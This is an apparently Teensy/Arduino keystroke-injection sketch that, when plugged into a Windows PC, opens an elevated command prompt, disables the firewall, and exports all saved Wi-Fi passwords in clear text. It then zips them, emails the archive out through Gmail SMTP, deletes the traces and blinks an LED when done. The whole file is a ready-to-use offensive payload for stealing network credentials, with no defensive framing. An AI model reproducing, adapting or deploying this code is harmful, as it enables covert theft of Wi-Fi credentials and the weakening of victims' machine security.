const unsigned int ledPin = 17;
const unsigned int delayTime = 1500;
void setup()
{
  delay(1000);



  // Do the shit...
  pwn();

}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void pwn()
{

  key(KEY_D , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

 openapp("powershell Start-Process cmd -Verb runAs");
 delay(2000);
 key(KEY_LEFT, 0);
 delay(500);
 key(KEY_ENTER, 0);
 delay(1100);
  Keyboard.println("cd %USERPROFILE%");
  Keyboard.println("netsh firewall set opmode mode=disable");
  Keyboard.println("mkdir wifipass");
  Keyboard.println("cd wifipass");
  Keyboard.println("netsh wlan export profile key=clear");
  Keyboard.println("cd ../");
  Keyboard.println("powershell");
  Keyboard.println("Add-Type -A System.IO.Compression.FileSystem");
  Keyboard.println("[IO.Compression.ZipFile]::CreateFromDirectory('wifipass', 'wifipass.zip')");
  Keyboard.println("$From = 'EMAIL@gmail.com'");
  Keyboard.println("$To = 'EMAIL@gmail.com'");
  Keyboard.println("$Cc = 'EMAIL@gmail.com'");
  Keyboard.println("$Attachment = 'wifipass.zip'");
  Keyboard.println("$Subject = 'Email Subject'");
  Keyboard.println("$Body = 'Insert Body text here'");
  Keyboard.println("$SMTPServer = 'smtp.gmail.com'");
  Keyboard.println("$SMTPPort = '587'");
  Keyboard.println("$User = 'EMAIL'");
  Keyboard.println("$PWord = ConvertTo-SecureString -String 'PASSWORD' -AsPlainText -Force");
  Keyboard.println("$Credential = New-Object -TypeName 'System.Management.Automation.PSCredential' -ArgumentList $User, $PWord");
  Keyboard.print("Send-MailMessage -From $From -to $To -Cc $Cc -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl -Credential $Credential -Attachments $Attachment");
  delay(1000);
  Keyboard.println("del wifipass.zip");
  delay(100)
  Keyboard.println("del wifipass");
  key(KEY_ENTER, 0);
  Keyboard.println("exit");
  delay(8000);
  Keyboard.println("exit");
 key(KEY_F4, MODIFIERKEY_LEFT_ALT);
 delay(100);

}

void loop()
{
  // Blink -> IT'S DONE
  digitalWrite(ledPin, HIGH);
  delay(80);
  digitalWrite(ledPin, LOW);
  delay(80);
}